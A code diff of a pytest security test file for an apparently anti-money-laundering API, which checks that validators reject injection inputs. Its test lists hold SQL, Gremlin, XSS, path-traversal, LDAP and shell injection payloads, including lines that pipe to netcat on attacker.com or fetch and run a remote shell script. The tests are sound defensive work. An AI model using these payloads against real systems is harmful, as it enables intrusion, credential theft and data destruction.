@@ -14,8 +14,9 @@ Tests defense against common injection attacks:
 import pytest
 from pydantic import ValidationError
 
-from src.python.api.models import UBORequest, StructuringAlertRequest
-from src.python.utils.validation import Validator, ValidationError as UtilsValidationError
+from src.python.api.models import StructuringAlertRequest, UBORequest
+from src.python.utils.validation import ValidationError as UtilsValidationError
+from src.python.utils.validation import Validator
 
 
 class TestSQLInjectionPrevention:
@@ -29,26 +30,21 @@ class TestSQLInjectionPrevention:
         "admin'--",
         "admin' #",
         "admin'/*",
-        
         # Union-based injection
         "' UNION SELECT NULL--",
         "' UNION SELECT * FROM users--",
         "' UNION ALL SELECT NULL,NULL,NULL--",
-        
         # Boolean-based blind injection
         "' AND 1=1--",
         "' AND 1=2--",
         "' AND 'x'='x",
-        
         # Time-based blind injection
         "'; WAITFOR DELAY '00:00:05'--",
         "'; SELECT SLEEP(5)--",
-        
         # Stacked queries
         "'; DROP TABLE users--",
         "'; DELETE FROM accounts WHERE '1'='1",
         "'; UPDATE users SET password='hacked'--",
-        
         # Error-based injection
         "' AND 1=CONVERT(int, (SELECT @@version))--",
         "' AND 1=CAST((SELECT @@version) AS int)--",
@@ -75,15 +71,12 @@ class TestGremlinInjectionPrevention:
         "g.V().drop()",
         "g.V().properties().drop()",
         "'); g.V().drop(); g.V('",
-        
         # Property manipulation
         "').property('admin', true).next(); g.V('",
         "').sideEffect{it.get().remove()}.next(); g.V('",
-        
         # Data exfiltration
         "').values('password').next(); g.V('",
         "').valueMap().next(); g.V('",
-        
         # Groovy code injection
         "'); System.exit(0); g.V('",
         "'); new File('/etc/passwd').text; g.V('",
@@ -111,26 +104,21 @@ class TestXSSPrevention:
         "<script>alert('XSS')</script>",
         "<script>alert(1)</script>",
         "<script>alert(document.cookie)</script>",
-        
         # Event handler XSS
         "<img src=x onerror=alert(1)>",
         "<body onload=alert(1)>",
         "<svg onload=alert(1)>",
         "<iframe onload=alert(1)>",
-        
         # JavaScript protocol
         "javascript:alert(1)",
         "javascript:alert(document.domain)",
         "javascript:void(0)",
-        
         # Encoded XSS
         "&#60;script&#62;alert(1)&#60;/script&#62;",
         "%3Cscript%3Ealert(1)%3C/script%3E",
-        
         # DOM-based XSS
         "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
         "<svg><script>alert&#40;1&#41;</script>",
-        
         # Filter bypass attempts
         "<scr<script>ipt>alert(1)</scr</script>ipt>",
         "<<SCRIPT>alert(1);//<</SCRIPT>",
@@ -159,25 +147,19 @@ class TestPathTraversalPrevention:
         "../../../../etc/shadow",
         "../../../var/log/auth.log",
         "../../.ssh/id_rsa",
-        
         # Windows path traversal
         "..\\..\\..\\windows\\system32\\config\\sam",
         "..\\..\\..\\boot.ini",
-        
         # URL encoded
         "..%2F..%2F..%2Fetc%2Fpasswd",
         "..%5C..%5C..%5Cwindows%5Csystem32",
-        
         # Double encoding
         "..%252F..%252F..%252Fetc%252Fpasswd",
-        
         # Unicode encoding
         "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-        
         # Null byte injection
         "../../../etc/passwd%00",
         "..\\..\\..\\windows\\system32%00.txt",
-        
         # Dot-dot-slash variations
         "....//....//....//etc/passwd",
         "....\\\\....\\\\....\\\\windows\\system32",
@@ -206,15 +188,12 @@ class TestCommandInjectionPrevention:
         "& whoami",
         "&& id",
         "|| uname -a",
-        
         # Command substitution
         "$(cat /etc/passwd)",
         "`cat /etc/passwd`",
-        
         # Pipe commands
         "| nc attacker.com 4444",
         "; curl http://attacker.com/shell.sh | sh",
-        
         # Background execution
         "; sleep 10 &",
         "& ping -c 10 127.0.0.1 &",
@@ -241,11 +220,9 @@ class TestLDAPInjectionPrevention:
         "*)(uid=*))(|(uid=*",
         "admin)(&(password=*))",
         "*)(objectClass=*",
-        
         # LDAP authentication bypass
         "*)(|(password=*",
         "admin)(|(password=*))",
-        
         # LDAP enumeration
         "*)(cn=*",
         "*)(mail=*",
@@ -277,7 +254,7 @@ class TestSpecialCharacterHandling:
 
     def test_control_characters(self):
         """Control characters should be rejected."""
-        control_chars = ["\x01", "\x02", "\x03", "\x1F"]
+        control_chars = ["\x01", "\x02", "\x03", "\x1f"]
         for char in control_chars:
             with pytest.raises(ValidationError):
                 UBORequest(company_id=f"COMP{char}123")
@@ -339,7 +316,7 @@ class TestDefenseInDepth:
         # Pydantic model validation (first layer)
         with pytest.raises(ValidationError):
             UBORequest(company_id="<script>alert(1)</script>")
-        
+
         # Validator utility validation (second layer)
         with pytest.raises(UtilsValidationError):
             Validator.validate_account_id("<script>alert(1)</script>")
@@ -347,13 +324,14 @@ class TestDefenseInDepth:
     def test_consistent_validation_rules(self):
         """Validation rules should be consistent across layers."""
         test_id = "VALID-ID-123"
-        
+
         # Should pass Pydantic validation
         request = UBORequest(company_id=test_id)
         assert request.company_id == test_id
-        
+
         # Should pass Validator validation
         result = Validator.validate_account_id(test_id)
         assert result == test_id
+
 
 # Made with Bob
